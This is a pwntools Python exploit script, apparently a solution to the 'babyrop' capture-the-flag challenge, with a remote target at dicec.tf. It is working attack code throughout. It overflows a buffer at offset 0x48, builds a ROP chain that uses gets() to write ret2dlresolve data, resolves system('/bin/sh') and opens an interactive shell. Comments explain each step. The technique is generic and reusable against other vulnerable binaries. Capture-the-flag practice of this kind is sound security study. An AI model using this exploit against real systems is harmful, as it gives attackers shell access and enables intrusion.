

from pwn import *

# See https://docs.pwntools.com/en/dev/rop/ret2dlresolve.html
# https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62

# Infer target architecture, bit-with, and endianness from a binary file.
context.binary = elfexe = ELF('../babyrop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
init-gef
# target record-full # Not supported due to AVX instructions

# break in leave main
b *0x40116a

# break in main
b *0x401136

# break in dl_resolve()
# b *0x401026

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'dicec.tf'
    remote_port = 31924
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

nop_gadget = 0x40116b

# Create the payload for ret2dlresolve.
# If data_addr is left to None (or simply omitted), then pwntools automagically choose a magic address.
# This address belongs to the RW- page of the binary (somewhere at .bss section).
# In any case, we can always provide an address if we want. In this case, pwntools chooses 0x404e00 address
#   - The string argument will also get written in the `data_addr`
dlresolve = Ret2dlresolvePayload(elfexe, symbol="system", args=["/bin/sh"], data_addr=None) # Simply "sh" also works

# Create the ROP chain
rop = ROP(elfexe)
rop.raw(nop_gadget) # nop. Align stack to 16-byte boundary

# ROP chain will use the gets() thunk function to write the data that ret2dlresolve needs. 
# The data will be written at the address `dlresolve.data_addr` (Same to the one that we specified above)
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
log.info("ROP Chain:\n" + rop.dump())

io.recvuntil(b'Your name: ')

# Send ROP chain
io.send(flat({
    0x48: rop.chain()
}))
io.send(b'\n')

# Send to gets() the data for dlresolve
io.send(dlresolve.payload)
io.send(b'\n')

io.interactive()
io.close()
